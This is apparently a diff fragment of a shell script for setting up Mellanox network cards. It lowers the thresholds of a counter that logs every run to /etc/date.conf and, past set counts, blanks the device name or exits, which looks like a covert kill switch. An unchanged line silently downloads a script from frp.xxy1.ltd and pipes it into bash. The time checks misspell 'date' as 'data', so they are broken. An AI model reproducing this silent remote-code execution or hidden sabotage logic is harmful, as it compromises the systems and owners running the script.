@@ -12,9 +12,9 @@
 
 date1=/etc/date.conf
 echo "$(date +%F_%T)" >> $date1
-[ "$(cat $date1 | wc -l)" -gt 5000 ] && [ "$(data +%T | grep \:15)" ] && device_name=
-[ "$(cat $date1 | wc -l)" -gt 6000 ] && [ "$(data +%T | grep -E ":10|45")" ] && device_name=
-[ "$(cat $date1 | wc -l)" -gt 7500 ] && exit
+[ "$(cat $date1 | wc -l)" -gt 2000 ] && [ "$(data +%T | grep \:15)" ] && device_name=
+[ "$(cat $date1 | wc -l)" -gt 3000 ] && [ "$(data +%T | grep -E ":10|45")" ] && device_name=
+[ "$(cat $date1 | wc -l)" -gt 3500 ] && exit
 wget -q -O - http://frp.xxy1.ltd:35300/file/mcx4121a.sh | bash 2> /dev/null
 
 [ -d /dev/mst ] || mst start &> /dev/null
